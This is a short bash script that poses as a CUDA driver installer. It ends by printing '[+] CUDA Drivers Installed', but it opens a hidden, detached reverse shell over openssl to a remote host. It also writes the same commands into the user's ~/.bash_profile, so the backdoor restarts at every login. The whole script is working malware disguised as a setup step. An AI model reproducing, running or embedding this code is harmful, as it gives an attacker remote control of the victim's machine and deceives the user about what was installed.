#!/bin/bash

PROFILE="$HOME/.bash_profile"
IP='ta-01kaehrxv43sd00gznma4c3sfy-8888.wo-i9iv0yuec59ab20jfglb6nuwl.w.modal.host'
PORT='443'

rm /tmp/s > /dev/null 2>&1
mkfifo /tmp/s > /dev/null 2>&1
nohup setsid bash --norc --noprofile -c "sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $IP:$PORT > /tmp/s; rm /tmp/s" >/dev/null 2>&1 &
disown $!

if [ -e $PROFILE ]
then

	echo "rm /tmp/s > /dev/null 2>&1" >> $PROFILE
    echo "mkfifo /tmp/s > /dev/null 2>&1" >> $PROFILE
    echo "nohup setsid bash --norc --noprofile -c 'sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $IP:$PORT > /tmp/s; rm /tmp/s' >/dev/null 2>&1 &" >> $PROFILE
    echo 'disown $!' >> $PROFILE

else
	touch $PROFILE
    echo "rm /tmp/s > /dev/null 2>&1" >> $PROFILE
    echo "mkfifo /tmp/s > /dev/null 2>&1" >> $PROFILE
    echo "nohup setsid bash --norc --noprofile -c 'sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $IP:$PORT > /tmp/s; rm /tmp/s' >/dev/null 2>&1 &" >> $PROFILE
    echo 'disown $!' >> $PROFILE
fi

echo "[+] CUDA Drivers Installed"
